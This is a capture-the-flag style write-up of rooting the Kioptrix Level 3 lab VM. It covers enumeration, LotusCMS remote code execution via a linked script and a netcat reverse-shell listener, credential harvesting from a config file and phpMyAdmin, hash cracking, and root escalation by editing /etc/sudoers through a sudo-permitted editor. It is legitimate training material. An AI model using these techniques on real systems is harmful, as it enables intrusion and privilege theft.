# Kioptrix Level 3 (1.2)

This machine was definitely harder than Kioptrix 1 and 2. I struggled to find the credentials of the user needed to continue privesc to root. <br>
Here, you will find my writeup for the third machine of this series. 
To setup this machine on Proxmox and a DHCP server, please refer to my second writeup: <a href="https://hiramf0.github.io/2026/04/05/kioptrix-level-2.html">https://hiramf0.github.io/2026/04/05/kioptrix-level-2.html</a> <br>

## Enumeration
First, we find the IP address from `arpscan`.

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ sudo arp-scan --interface=eth2 -l
Interface: eth2, type: EN10MB, MAC: bc:24:11:b4:13:a7, IPv4: 10.0.1.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.1.102      bc:24:11:e6:21:f8       (Unknown)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.155 seconds (118.79 hosts/sec). 1 responded
```

We need to add this IP address to our hosts file to access the website, as recommended by the developer.

```bash
└─$ sudo nano /etc/hosts
10.0.1.102 kioptrix3.com

```

Next, we continue our enumeration with nmap.
```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ nmap 10.0.1.102 -sV 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-29 15:09 MDT
Nmap scan report for kioptrix3.com (10.0.1.102)
Host is up (0.0065s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: BC:24:11:E6:21:F8 (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ nmap 10.0.1.102 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-29 15:09 MDT
Nmap scan report for kioptrix3.com (10.0.1.102)
Host is up (0.0062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: BC:24:11:E6:21:F8 (Proxmox Server Solutions GmbH)

Nmap done: 1 IP address (1 host up) scanned in 10.98 seconds
```

Nothing else is open, so let's visit the website. <br>
<img width="807" height="552" alt="image" src="https://github.com/user-attachments/assets/f06c007a-a0c5-4ac6-bf48-bcf729d9b106" />
<br>

The login page contains the name of the CMS used for the website: `LotusCMS`. This will be relevant for exploit research. <br>
<img width="765" height="463" alt="image" src="https://github.com/user-attachments/assets/070f5257-baf2-44bb-9d05-5372666289a5" />
<br>

An interesting username mentioned in the webpage: `loneferret`. <br>
<img width="789" height="458" alt="image" src="https://github.com/user-attachments/assets/5dbad366-bad4-488e-9e1d-1c51865fc23a" />

Let's also check the gallery mentioned in the homepage. <br>
<img width="909" height="651" alt="image" src="https://github.com/user-attachments/assets/e17889d7-3029-4a06-bf05-4d8fb0eafe91" />
<br>

I looked around in the source code for `/gallery` and found the `/gadmin` directory, which could be useful later:
```html
48 <!--  <a href="gadmin">Admin</a>&nbsp;&nbsp; -->
```

Did I miss any directories in the initial webpage?

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://kioptrix3.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 355] [--> http://kioptrix3.com/modules/]
/data                 (Status: 403) [Size: 324]
/gallery              (Status: 301) [Size: 355] [--> http://kioptrix3.com/gallery/]
/core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]
/style                (Status: 301) [Size: 353] [--> http://kioptrix3.com/style/]
/cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]
/phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

We will visit `/phpmyadmin` later. Let's try abusing LotusCMS, which appears to be an old CMS and no longer maintained.

## Initial User Access - www-data

Doing some research on LotusCMS, I found this script to abuse it: <br>
<a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh</a> <br>
<br>
Let's run it with `./lotusRCE.sh kioptrix3.com /`. This program can open a reverse shell for us, so let's also start a `nc` connector on another terminal: `nc -lvnp 7777`.

<img width="564" height="350" alt="image" src="https://github.com/user-attachments/assets/f5d4de7a-a5ff-49b8-90df-02737ced5694" />

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.0.1.2] from (UNKNOWN) [10.0.1.104] 48840
whoami
www-data
```

Great! Let's also upgrade our shell:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## /phpadmin access -> loneferret access

Going back to `/phpmyadmin` on the website, maybe there's some config files in the machine we can read to find creds and access this portal.

Looking around in our home directory, we can find our desired config file:
```bash
www-data@Kioptrix3:/home/www/kioptrix3.com$ cat gallery/gconfig.php
cat gallery/gconfig.php
<?php
        error_reporting(0);
        /*
                A sample Gallarific configuration file. You should edit
                the installer details below and save this file as gconfig.php
                Do not modify anything else if you don't know what it is.
        */

        // Installer Details -----------------------------------------------

        // Enter the full HTTP path to your Gallarific folder below,
        // such as http://www.yoursite.com/gallery
        // Do NOT include a trailing forward slash

        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "*******";

        // Setting Details -------------------------------------------------

if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
                echo("A connection to the database couldn't be established: " . mysql_error());
                die();
}else {
        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                echo("The Gallarific database couldn't be opened: " . mysql_error());
                die();
        }else {
                $settings=mysql_query("select * from gallarific_settings");
                if(mysql_num_rows($settings)!=0){
                        while($data=mysql_fetch_array($settings)){
                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
                        }
                }

        }
}

?>
```

These credentials don't work on the main login page or the Gallantric `/gadmin` login. Let's try using them in our `/phpmyadmin` directory: <br>
<img width="685" height="511" alt="image" src="https://github.com/user-attachments/assets/176c6bda-0c7e-4441-bc53-3bf9e7d3a0c6" /> <br>
<img width="638" height="363" alt="image" src="https://github.com/user-attachments/assets/8c36de1f-2f4b-40e1-9e2a-8e593e202ca6" /> <br>

Great, let's read the tables. Here's `gallarific_users` with admin creds:
<img width="910" height="471" alt="image" src="https://github.com/user-attachments/assets/733edc47-8fde-448c-b054-05573936bd65" />

Using these credentials in the `/gallery/gadmin` login page gives me superuser access to the gallery site! Let's return back to the PHP portal. <br>
<img width="917" height="435" alt="image" src="https://github.com/user-attachments/assets/b9368719-781d-4b04-8a5d-5ae2c78761a2" />  <br>

Let's check `dev_accounts`:<br>
<img width="862" height="528" alt="image" src="https://github.com/user-attachments/assets/352ff01e-17f6-4faa-8e79-08d07798559f" /> <br>

There's `loneferret` from before! Let's crack these hashes using crackstation.net:
<img width="1137" height="295" alt="image" src="https://github.com/user-attachments/assets/fd4d9347-568a-4e79-badd-0fee3ea8a203" />

Let's switch user on the reverse shell we have:
```bash
www-data@Kioptrix3:/home$ su dreg
su dreg
Password: *****r

dreg@Kioptrix3:/home$ cd dreg
cd dreg
rbash: cd: restricted
dreg@Kioptrix3:/home$ 
```

It seems `dreg` can't do much here, what about `loneferret`? He's the protegé of our sysadmin, he should have access to more sensitive data:
```bash
www-data@Kioptrix3:/$ su loneferret
su loneferret
Password: ******rs

loneferret@Kioptrix3:/$ cd /home/loneferret
cd /home/loneferret
loneferret@Kioptrix3:~$ ls
ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README
cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

Does this mean we have sudo perms on `ht`? Let's double check with `sudo -l`:
```bash
loneferret@Kioptrix3:~$ sudo -l
sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

## Privilege Escalation with ht

It seems I'll have to try running this `ht` executable. I really can't do anything on the TTY shell:
```bash
loneferret@Kioptrix3:/tmp$ touch test.txt
touch test.txt
loneferret@Kioptrix3:/tmp$ sudo ht test.txt
sudo ht test.txt
Error opening terminal: unknown.
```

Let's move over to `ssh` since port 22 is open:
```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl3]
└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
    loneferret@10.0.1.102
The authenticity of host '10.0.1.102 (10.0.1.102)' can't be established.
RSA key fingerprint is: SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.1.102' (RSA) to the list of known hosts.
loneferret@10.0.1.102's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ 
```

Doing some research, it seems `ht` is a text editor. Let's execute `sudo ht` to look around:
```bash
loneferret@Kioptrix3:~$ export TERM=xterm                     
loneferret@Kioptrix3:~$ sudo ht
```
<img width="922" height="415" alt="image" src="https://github.com/user-attachments/assets/90539be5-473f-497c-b662-b386a608b5c6" /> <br>
Let's modify some sensitive file to get root access. Use F3 to open a file. Type `/etc/sudoers` and Enter to modify the `sudoers` file. <br>
<img width="893" height="461" alt="image" src="https://github.com/user-attachments/assets/4c59428d-bf01-4994-817a-0f1164b706f7" /> <br>

Navigate down to the loneferret user and add `/bin/bash` to run a bash shell as root:
```bash
loneferret ALL=NOPASSWD: /usr/bin/su, /usr/local/bin/ht, /bin/bash
```

Save with Alt+F, scroll to Save and press Enter. Use Ctrl+C to quit. Let's privesc now.
```bash
loneferret@Kioptrix3:~$ sudo ht
loneferret@Kioptrix3:~$ sudo /bin/bash 
root@Kioptrix3:~# whoami
root
```

We have **root** access!
```txt
root@Kioptrix3:/root# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

## Breaking sudoers...
In a previous run, I broke the machine with `ht`'s hex mode, which left me permanently stuck as loneferret. Here's a recreation of how i broke `sudoers`...
```bash
loneferret@Kioptrix3:~$ export TERM=xterm                     
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
```

<img width="912" height="472" alt="image" src="https://github.com/user-attachments/assets/29b23997-f193-45ed-91e3-e81d96048166" /> <br>

Running `ht` like that opens the editor in hex mode. You can use F4 to edit, F8 to resize in order to type, and set to 700 to have some writing space. <br>
I tried adding `loneferret ALL=(ALL:ALL) ALL` at the end in hexadecimal. For some reason, the file was not able to read it. Let's simulate this by adding a bunch of characters to simulate a typo or using the wrong payload: <br>
<img width="616" height="186" alt="image" src="https://github.com/user-attachments/assets/0ff6ab7a-40ad-4ad0-860e-98c72ece72fc" /> <br>

Save with Alt+F > Save. <br>
Now, nothing works and we need to create a new machine to start over... <br>
Luckily, I'm running this on Proxmox so it took me 3 minutes to create a new machine from the same VM disk and return to where I started.  <br>
<img width="395" height="158" alt="image" src="https://github.com/user-attachments/assets/94e96ff3-abf4-4a77-ae92-3c1114ab7c1f" /> <br>

Honestly, this is a pretty great place to learn that I should be more careful when messing with core Linux files. <br>
<img width="898" height="497" alt="image" src="https://github.com/user-attachments/assets/575db9ff-12f7-4093-b5d0-4173503e3c9a" /> <br>

※ This is the end of this writeup. Hope I can continue writing about this series of VMs!













